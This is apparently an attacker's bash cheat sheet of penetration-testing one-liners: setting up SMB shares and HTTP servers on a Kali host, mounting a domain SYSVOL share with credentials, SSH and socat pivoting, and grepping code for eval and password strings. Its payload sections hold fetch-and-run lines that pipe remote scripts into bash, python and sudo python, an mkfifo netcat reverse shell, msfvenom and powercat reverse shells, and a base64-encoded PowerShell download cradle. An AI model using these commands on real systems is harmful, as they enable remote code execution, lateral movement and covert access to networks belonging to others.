#!/usr/bin/env bash

# local share
net usershare add kali `pwd` kali everyone:F guest_ok=y
smbserver.py -ip 10.9.8.1 kali ./

# remote share
mount -t cifs //192.168.1.1/SYSVOL ./mount -o username=first.last,domain=domain.local,iocharset=utf8,file_mode=0777,dir_mode=0777
smbclient.py domain.local/first.last:password@10.9.8.1

# port forwards / proxy
ssh -f -N -L 10.9.8.2:3000:127.0.0.1:3000 10.9.8.1
ssh -f -N -D 192.168.243.128:65535 root@10.9.8.2
socat TCP4-LISTEN:445,fork,bind=10.9.8.2 SOCKS4:192.168.243.128:10.49.97.29:445,socksport=65535

# searches
find ./ -type f -name routes.json 2>/dev/null
grep -ilr eval ./
grep -r "eval(" ./ --color
egrep -ril "^.*eval|exec|upload|install|deserialize|decrypt|decode|auth|password|passcode|passphrase.*" ./ --color
egrep -ril "^.*serialize|deserialize.*typeof.*gettype" --color
grep -rnw "^.*select.*from.*where.*" --color

# http server
python -c 'import BaseHTTPServer as bhs, SimpleHTTPServer as shs; bhs.HTTPServer(("10.9.8.1", 80), shs.SimpleHTTPRequestHandler).serve_forever()'
python -m SimpleHTTPServer 80

# encoding
strings file.ps1  | iconv -f ASCII -t UTF-16LE - | base64 | tr -d "\n"
iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"

# bash oneliners
wget -q -O - http://10.10.10.1/pwn.sh | bash
curl -fsSL http://10.10.10.1/pwn.sh | bash
rm /tmp/pwn;mkfifo /tmp/pwn;cat /tmp/pwn|/bin/sh -i 2>&1|/bin/nc 10.9.8.2 443 >/tmp/pwn

# python oneliners
wget -q -O - http://10.10.10.1/pwn.py | python -
curl -s http://10.10.10.1/pwn.py | sudo python -
msfvenom -p python/shell_reverse_tcp LHOST=10.10.10.1 LPORT=443 > pwn.py
python -c 'import pty;pty.spawn("/bin/bash")'

# powershell payloads
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
echo powercat -c 10.9.8.1 -p 443 -ep >> powercat.ps1
printf "iex(new-object system.net.webclient).downloadstring('http://10.10.10.1/pwn.ps1')" | iconv -f ASCII -t UTF-16LE - | base64 | tr -d "\n"
